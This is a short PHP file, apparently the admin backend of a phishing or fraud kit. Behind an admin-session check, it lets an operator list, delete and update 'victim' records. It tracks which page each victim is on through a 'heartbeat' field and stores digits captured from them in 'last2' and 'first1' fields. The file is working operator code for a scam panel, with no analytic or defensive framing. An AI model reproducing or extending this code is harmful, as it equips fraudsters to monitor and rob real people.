<?php

require_once( 'functions.php' );

// admin panel victim updating

if ( isset( $_SESSION[ 'admin' ] ) && ( $_SESSION[ 'admin' ] == ADMIN_LOGIN ) ) {

	if ( isset( $_GET[ 'action' ] ) ) {

		if ( $_GET[ 'action' ] == 'delete' ) {

			if ( isset( $_GET[ 'id' ] ) ) {

				deleteVictim( $pdo, intval( $_GET[ 'id' ] ) );

				die( json_encode( [ 'status' => $_GET[ 'id' ] ] ) );

			} else {

				die( json_encode( [ 'status' => 'error', 'message' => 'id' ] ) );

			}

		}

		if ( $_GET[ 'action' ] == 'page' ) {

			if ( isset( $_GET[ 'id' ] ) && isset( $_GET[ 'page' ] ) ) {

				updateVictim( $pdo, intval( $_GET[ 'id' ] ), [
					'heartbeat' => intval( $_GET[ 'page' ] )
				] );

				if ( isset( $_GET[ 'last2' ] ) ) {

					updateVictim( $pdo, intval( $_GET[ 'id' ] ), [
						'last2' => intval( $_GET[ 'last2' ] )
					] );

				}

				if ( isset( $_GET[ 'first1' ] ) ) {

					updateVictim( $pdo, intval( $_GET[ 'id' ] ), [
						'first1' => intval( $_GET[ 'first1' ] )
					] );

				}

				die( json_encode( [ 'status' => $_GET[ 'id' ] ] ) );

			} else {

				die( json_encode( [ 'status' => 'error', 'message' => 'id' ] ) );

			}

		}

		if ( $_GET[ 'action' ] == 'getall' ) {

			die( json_encode( [ 'status' => getAllVictims( $pdo ) ] ) );

		}

	} else {

		die( json_encode( [ 'status' => 'error', 'message' => 'action' ] ) );

	}

} else {

	die( json_encode( [ 'status' => 'error', 'message' => 'perms' ] ) );

}

?>